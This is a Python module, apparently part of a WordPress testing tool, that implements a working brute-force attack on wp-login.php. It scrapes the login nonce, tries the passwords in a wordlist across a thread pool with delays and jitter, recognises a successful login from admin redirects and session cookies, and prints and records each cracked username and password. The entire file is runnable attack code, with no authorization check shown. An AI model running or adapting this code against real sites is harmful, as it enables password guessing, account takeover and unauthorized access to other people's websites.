"""attacks/wplogin.py — WordPress wp-login.php brute-force."""
from __future__ import annotations
import logging, re, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from ..base import WordPressTesterBase, Credential

log        = logging.getLogger(__name__)
LOGIN_PATH = "/wp-login.php"
_NONCE_RE  = re.compile(r'name="[^"]*nonce[^"]*"\s+value="([a-f0-9]+)"', re.I)
_CHUNK     = 500


def _is_success(resp) -> bool:
    if resp is None or resp.status_code not in (200, 302):
        return False
    body = resp.text or ""
    if any(s in body for s in ("login_error", "incorrect_password", "invalid_username")):
        return False
    if "/wp-admin/" in (resp.url or ""):
        return True
    if any(c.name.startswith(("wordpress_logged_in_", "wordpress_sec_"))
           for c in resp.cookies):
        return True
    return False


def _chunks(path: Path, size: int):
    chunk = []
    with path.open(errors="ignore") as fh:
        for raw in fh:
            w = raw.strip()
            if not w or w.startswith("#"):
                continue
            chunk.append(w)
            if len(chunk) >= size:
                yield chunk; chunk = []
    if chunk:
        yield chunk


def _progress(tested: int, chunk_num: int, username: str) -> None:
    filled = min(chunk_num % 20, 20)
    bar    = "█" * filled + "░" * (20 - filled)
    line   = (f"\r  [WPLOGIN] user={username}  chunk={chunk_num:>4}  "
              f"tested≈{tested:>6}  [{bar}]  no match yet   ")
    sys.stdout.write(line)
    sys.stdout.flush()


class WPLoginAttack(WordPressTesterBase):
    """Brute-force WordPress via wp-login.php with thread pool."""

    def run(self) -> list[Credential]:
        if not self.usernames:
            log.warning("[WPLOGIN] No usernames"); return []
        url   = f"{self.target}{LOGIN_PATH}"
        nonce = self._fetch_nonce(url)
        print(f"[WPLOGIN] Login page confirmed \u2705  starting attack...\n")
        for username in self.usernames:
            cred = self.attack(username, url=url, nonce=nonce)
            if cred and self.config.get("stop_on_first", True):
                break
        return self.found_credentials

    def attack(self, username: str, *, url: str | None = None,
               nonce: str | None = None) -> Credential | None:
        if not self.wordlist:
            log.error("[WPLOGIN] No wordlist"); return None
        url  = url or f"{self.target}{LOGIN_PATH}"
        wl   = Path(self.wordlist)
        n    = int(self.config.get("threads", 5))
        if not wl.is_file():
            raise FileNotFoundError(wl)

        print(f"[WPLOGIN] Attacking '{username}'  threads={n}")

        stop      = threading.Event()
        found     = None
        tested    = 0
        chunk_num = 0

        with ThreadPoolExecutor(max_workers=n, thread_name_prefix="wplogin") as pool:
            for chunk in _chunks(wl, _CHUNK):
                if stop.is_set():
                    break
                chunk_num += 1
                futures = {pool.submit(self._check, username, pwd, url, nonce, stop): pwd
                           for pwd in chunk}
                for future in as_completed(futures):
                    pwd = futures[future]
                    tested += 1
                    try:
                        ok = future.result()
                    except Exception as e:
                        log.debug("[WPLOGIN] Worker error: %s", e); continue
                    if ok:
                        stop.set()
                        sys.stdout.write("\r" + " " * 80 + "\r")
                        sys.stdout.flush()
                        print(f"\n  [!!!] SUCCESS  {username}:{pwd}\n")
                        found = self._add_credential(username, pwd, note="wp-login")
                        for f in futures: f.cancel()
                        break

                if not stop.is_set():
                    _progress(tested, chunk_num, username)
                    time.sleep(self.delay)

        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.flush()
        if not found:
            print(f"  [WPLOGIN] '{username}' — wordlist exhausted ({tested} passwords tested), no match.")
        return found

    def _fetch_nonce(self, url: str) -> str | None:
        resp = self._request("GET", url, jitter=False)
        if resp and resp.status_code == 200:
            m = _NONCE_RE.search(resp.text)
            return m.group(1) if m else None
        return None

    def _check(self, username: str, password: str, url: str,
               nonce: str | None, stop: threading.Event) -> bool:
        if stop.is_set():
            return False
        payload = {
            "log": username, "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.target}/wp-admin/",
            "testcookie": "1",
        }
        if nonce:
            payload["_wpnonce"] = nonce
        resp = self._request("POST", url, data=payload, jitter=True, allow_redirects=True)
        return _is_success(resp)
